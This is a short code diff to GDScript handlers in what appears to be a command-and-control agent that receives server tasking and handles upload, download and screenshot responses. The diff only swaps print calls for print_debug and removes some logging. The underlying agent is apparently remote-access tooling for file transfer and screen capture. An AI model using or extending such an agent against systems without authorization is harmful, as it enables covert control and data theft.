@@ -49,7 +49,6 @@ func _on_transport_tasking(data):
 	if data.has("payload") and data.get("payload").has("tasks"):
 
 		for task in data.get("payload").get("tasks"):
-			print("task: ", task)
 			var command = task.get("command")
 
 			match command:
@@ -60,15 +59,13 @@ func _on_transport_tasking(data):
 				"upload":
 					task_id_to_last_action[task.get("id")] = command
 				_:
-					print("default tasking... ", task)
+					print_debug("default tasking... ", task)
 
 			if has_signal(command):
 				emit_signal(command, transport, task)
 
 
 func _on_transport_post_response(data):
-	print("_on_Agent_post_response: ", data)
-	
 	var payload = data.get("payload")
 
 	for response in payload.get("responses"):
@@ -82,19 +79,19 @@ func _on_transport_post_response(data):
 						emit_signal("upload_start", response)
 						task_id_to_last_action[task_id ] = "upload_chunk"
 					else:
-						print("Bad upload response: ", response)
+						print_debug("Bad upload response: ", response)
 				"upload_chunk":
 					if response.has("file_id"):
 						emit_signal("upload_chunk", response)
 						task_id_to_last_action[task_id ] = "upload_chunk"
 					else:
-						print("Bad upload response: ", response)
+						print_debug("Bad upload response: ", response)
 				"download":
 					if response.has("file_id"):
 						emit_signal("download_start", response)
 						task_id_to_last_action[task_id ] = "download_chunk"
 					else:
-						print("Bad download response: ", response)
+						print_debug("Bad download response: ", response)
 				"download_chunk":
 					emit_signal("download_chunk", response)
 					task_id_to_last_action[task_id ] = "download_chunk"
@@ -103,6 +100,6 @@ func _on_transport_post_response(data):
 						emit_signal("download_start", response)
 						task_id_to_last_action[task_id ] = "download_chunk"
 					else:
-						print("Bad screenshot response: ", response)
+						print_debug("Bad screenshot response: ", response)
 		else:
-			print("failed response: ", response)
+			print_debug("failed response: ", response)
